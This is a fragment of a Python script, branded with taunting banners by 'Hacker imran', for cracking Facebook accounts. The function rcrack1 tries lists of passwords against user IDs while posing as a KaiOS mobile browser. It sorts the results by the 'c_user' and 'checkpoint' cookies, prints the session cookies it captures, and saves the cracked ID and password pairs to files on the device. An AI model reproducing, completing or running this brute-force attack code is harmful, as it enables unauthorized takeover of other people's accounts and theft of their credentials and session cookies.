#SC MAKED BY Hacker imran
#Fuck Hacker imran
#Dec By Hacker imran
#Hacker imran Your Reyal Pappa
#Hacker imran Kids Numbar 5
...
\033[1;32m[-] AUTHOR    :\033[1;32m Hacker imran
\033[1;32m[-] GITHUB    :\033[1;32m imran2722
\033[1;32m[-] FACEBOOK  :\033[1;32m Hero Xtylish
\033[1;32m[-] YOUTUBE   :\033[1;32m yt.openinapp.co/ajoru
\033[1;92m══════════════════════════════════════════

\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS imran hacker\033[;0m\033[1;91m═══>\033[1;92m""")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mHacker imran\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[Hacker imran-OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                open('/sdcard/Hacker imran/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Hacker imran-CP❌] {uid}|{ps}")
                open('/sdcard/Hacker imran-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[Hacker imranG💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
